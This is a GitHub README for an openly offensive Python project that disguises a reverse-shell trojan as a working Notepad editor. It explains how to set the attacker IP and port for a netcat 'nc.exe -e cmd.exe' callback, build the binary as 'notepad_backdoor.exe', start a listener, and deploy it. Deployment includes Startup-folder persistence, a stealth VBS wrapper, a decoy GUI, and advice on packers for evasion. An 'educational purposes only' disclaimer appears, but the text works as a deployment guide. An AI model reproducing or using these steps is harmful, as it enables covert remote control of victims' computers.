# 🕵️‍♂️ Notepad-Reverse-Shell (Python + Netcat Reverse Shell)

A deceptive Notepad application built in Python that masquerades as a functional text editor while silently establishing a persistent reverse shell using `nc.exe`. The GUI mimics a standard Notepad, allowing users to open and save files, while covertly connecting to an attacker's machine every 10 seconds.

> ⚠️ **FOR EDUCATIONAL PURPOSES ONLY.**  
> **DO NOT USE ON SYSTEMS WITHOUT EXPLICIT AUTHORIZATION. Unauthorized use is illegal and unethical.**

---

## 🚀 Features

| Feature | Description |
|---------|-------------|
| ✔️ **Notepad GUI** | Fully functional text editor with open/save file capabilities |
| ✔️ **Reverse Shell** | Persistent Netcat reverse shell (`nc.exe -e cmd.exe`) |
| ✔️ **Silent Execution** | Runs covertly via a `.vbs` wrapper for stealth |
| ✔️ **UAC Elevation** | Automatically prompts for administrative privileges |
| ✔️ **Startup Persistence** | Auto-starts on reboot via `%APPDATA%` and Windows Startup folder |
| ✔️ **Retry Loop** | Reattempts reverse shell connection every 10 seconds if disconnected |
| ✔️ **Windows-Specific** | Executes only when Windows Defender is disabled and firewall permits outbound traffic |

---

## ⚙️ Configuration

Modify the following variables at the top of `Notepad.py` to configure the reverse shell:

```python
LHOST = "YOUR_ATTACKER_IP"  # Attacker's IP address
LPORT = 4444               # Attacker's listening port
NC_PATH = r"C:\Path\To\nc.exe"  # Path to Netcat executable on target
```

### Example Configuration
```python
LHOST = "192.168.138.128"
LPORT = 4444
NC_PATH = r"C:\Users\Test_Lab\Desktop\Toolbox\netcat\nc.exe"
```

---

## 📋 Prerequisites

Ensure the target system meets the following conditions for successful execution:

| Requirement | Description |
|-------------|-------------|
| **Operating System** | Windows 7, 8, 10, or 11 (32-bit or 64-bit) |
| **Windows Defender** | Must be disabled to allow `nc.exe` execution |
| **Firewall** | Must allow outbound traffic on the configured `LPORT` (e.g., 4444) |
| **Python 3.7+** | Required for development and building the `.exe` |
| **Tkinter** | GUI library (typically included with Python) |
| **PyInstaller** | Converts `.py` to `.exe` (`pip install pyinstaller`) |
| **Netcat (`nc.exe`)** | Windows-compatible Netcat binary (available from [Nmap Ncat](https://nmap.org/ncat)) |

---

## 🔨 Building the Executable

To compile `Notepad.py` into a silent, standalone `.exe`, follow these steps using a Python 3.7 virtual environment:

```bash
# 1. Navigate to the project directory
cd path\to\your\project

# 2. Create and activate a Python 3.7 virtual environment
py -3.7 -m venv venv37
venv37\Scripts\activate

# 3. Install PyInstaller
pip install pyinstaller

# 4. Clone the Repo
git clone https://github.com/arslanjv/notepad-reverse-shell.git
cd notepad-reverse-shell

# 5. Compile the script into a single executable
pyinstaller --onefile --noconsole --name=notepad_backdoor Notepad.py
```

### Output
- **Location**: `dist/notepad_backdoor.exe`
- **Size**: Approximately 5-10 MB (varies with dependencies)
- **Execution**: GUI-only, no console window

---

## 💻 Usage Instructions

### Attacker Machine
1. **Start a Netcat Listener**:
   ```bash
   ncat -lvnp 4444
   ```
   Ensure the port matches the `LPORT` configured in `Notepad.py`.

2. **Verify Network Accessibility**:
   - Confirm the attacker's machine is reachable from the target network.
   - Ensure no firewall blocks inbound traffic on `LPORT`.

### Target Machine (Windows)
1. **Prerequisites**:
   - **Disable Windows Defender**: The `.exe` will fail to execute if Windows Defender is active, as it may flag `nc.exe` as malicious.
   - **Configure Firewall**: Allow outbound traffic on the specified `LPORT` (e.g., 4444) via Windows Firewall or equivalent.

2. **Deploy the Executable**:
   - Double-click `notepad_backdoor.exe` on the target machine.
   - The executable will:
     - Prompt for UAC administrative access.
     - Deploy a `.bat` and `.vbs` file in `%APPDATA%` for persistence.
     - Add itself to the Windows Startup folder.
     - Initiate a reverse shell connection in a 10-second retry loop.
     - Launch a functional Notepad GUI as a decoy.

3. **Verify Execution**:
   - Check the attacker's listener for an incoming connection from the target.
   - Use the functional Notepad GUI to maintain the appearance of a legitimate application.

---

## 🛡️ Security Considerations

- **Windows Defender**: The reverse shell relies on `nc.exe`, which is often detected as malicious. Ensure Windows Defender is disabled on the target system for testing purposes.
- **Firewall Configuration**: The target’s firewall must permit outbound connections on the specified `LPORT`. Use `netsh advfirewall` or the Windows Firewall GUI to configure rules if needed.
- **Obfuscation**: The current implementation does not obfuscate `nc.exe` or the `.exe`. Consider tools like UPX or custom packers for enhanced stealth in advanced scenarios.
- **Privilege Escalation**: The UAC prompt requires user interaction. Without admin rights, persistence via the Startup folder may fail.

---

## ⚠️ Legal and Ethical Disclaimer

This project is intended **solely for educational purposes**, such as penetration testing, red team exercises, or malware analysis in controlled lab environments. Unauthorized deployment on systems without explicit permission is **illegal** and violates ethical standards. The author assumes **no responsibility** for misuse.

---

## 👨‍💻 Author

**Muhammad Arsalan Javed**   
**GitHub**: [github.com/arslanjv](https://github.com/arslanjv)  

---

## 📜 License

This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Use responsibly and respect all applicable laws.
